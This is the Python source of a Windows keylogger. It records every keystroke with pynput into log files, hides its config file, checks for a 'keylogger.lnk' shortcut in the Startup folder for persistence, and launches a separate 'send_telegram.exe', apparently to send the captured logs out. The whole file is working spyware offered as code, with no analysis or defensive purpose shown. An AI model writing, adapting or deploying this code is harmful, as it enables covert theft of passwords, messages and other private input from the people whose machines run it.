
from pynput.keyboard import Listener
from pynput import keyboard
import subprocess
import os
import ctypes

text = ""

def is_file_in_startup_folder(file_path):
    # Get the path to the startup folder
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    
    # Check if the file exists in the startup folder
    return os.path.isfile(os.path.join(startup_folder, file_path))


def hide_a_file(filename):
    # subprocess.run(["attrib","+H",filename],check=True)
    ctypes.windll.kernel32.SetFileAttributesW(filename, 2)  # Set as hidden

file_path = "keylogger.lnk"
if is_file_in_startup_folder(file_path):
    with open("log_text.txt","w") as file:
        file.write(text)
    with open("full_log.txt","a") as file:
        file.write(text)
else:
    hide_a_file(".\\config\\.env")
    with open(".\\config\\log_text.txt","w") as file:
        file.write(text)
    with open(".\\config\\full_log.txt","a") as file:
        file.write(text)

try:
    if is_file_in_startup_folder(file_path):
        extProc = subprocess.Popen(["send_telegram.exe"])
    else:
        extProc = subprocess.Popen([".\\config\\send_telegram.exe"])
    
except subprocess.CalledProcessError as e:
    # print(f"Error: {e}")
    pass

def on_press(key):
    global text

# Based on the key press we handle the way the key gets logged to the in memory string.
# Read more on the different keys that can be logged here:
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
        key = "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        key = " "
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    else:
        text += str(key).strip("'")

    if is_file_in_startup_folder(file_path):
        with open("log_text.txt","w",encoding='utf-8') as file:
            file.write(text)
    else:
        with open(".\\config\\log_text.txt","w",encoding='utf-8') as file:
            file.write(text)  
    key=str(key)
    key=key.replace("'","")

    if is_file_in_startup_folder(file_path):
        with open("full_log.txt","a",encoding='utf-8',) as file:
            file.write(key)
    else:
        with open(".\\config\\full_log.txt","a",encoding='utf-8',) as file:
            file.write(key)        

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
